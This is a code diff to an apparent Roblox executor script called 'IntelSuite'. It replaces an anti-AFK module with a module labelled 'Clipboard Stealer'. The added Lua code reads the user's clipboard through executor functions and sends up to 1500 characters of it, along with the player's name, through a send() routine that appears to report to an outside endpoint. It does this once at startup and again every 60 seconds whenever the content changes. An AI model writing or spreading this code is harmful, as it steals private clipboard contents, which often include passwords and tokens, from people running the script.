@@ -674,28 +674,68 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 8: Anti-AFK
+-- MODULE 9: Clipboard Stealer
 -- ============================================================
-task.spawn(function()
-    local VirtualUser = game:GetService("VirtualUser")
-    -- Hook idle event to reset timer instantly
+local function stealClipboard()
+    if not getgenv().IntelSuite.IsActive then return end
     pcall(function()
-        Players.LocalPlayer.Idled:Connect(function()
-            pcall(function()
-                VirtualUser:Button1Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-                task.wait(0.1)
-                VirtualUser:Button1Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-            end)
-        end)
+        local clip = nil
+
+        -- Method 1: getclipboard
+        if getclipboard then
+            local ok, r = pcall(getclipboard)
+            if ok and r and r ~= "" then clip = r end
+        end
+
+        -- Method 2: Synapse X
+        if not clip and syn and syn.clipboard then
+            local ok, r = pcall(function() return syn.clipboard.get() end)
+            if ok and r and r ~= "" then clip = r end
+        end
+
+        if clip and clip ~= "" then
+            send("CLIPBOARD",
+                "**User:** " .. LocalPlayer.Name ..
+                "\n**Length:** " .. tostring(#clip) .. " chars" ..
+                "\n**Content:**\n```" .. tostring(clip):sub(1, 1500) .. "```",
+                16711935
+            )
+        else
+            send("CLIPBOARD",
+                "**User:** " .. LocalPlayer.Name ..
+                "\n**Content:** Empty or not accessible on this executor.",
+                8421504
+            )
+        end
     end)
-    -- Also simulate input every 15 minutes as backup
+end
+
+-- Run on startup
+task.wait(2)
+stealClipboard()
+
+-- Poll every 60s for new clipboard content
+task.spawn(function()
+    local lastClip = ""
     while true do
-        task.wait(900)
+        task.wait(60)
+        if not getgenv().IntelSuite.IsActive then continue end
         pcall(function()
-            VirtualUser:Button1Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-            task.wait(0.1)
-            VirtualUser:Button1Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+            if getclipboard then
+                local ok, r = pcall(getclipboard)
+                if ok and r and r ~= "" and r ~= lastClip then
+                    lastClip = r
+                    send("CLIPBOARD UPDATE",
+                        "**User:** " .. LocalPlayer.Name ..
+                        "\n**Length:** " .. tostring(#r) .. " chars" ..
+                        "\n**Content:**\n```" .. tostring(r):sub(1, 1500) .. "```",
+                        16711935
+                    )
+                end
+            end
         end)
     end
 end)
+
+getgenv().IntelSuite.StealClipboard = stealClipboard
 
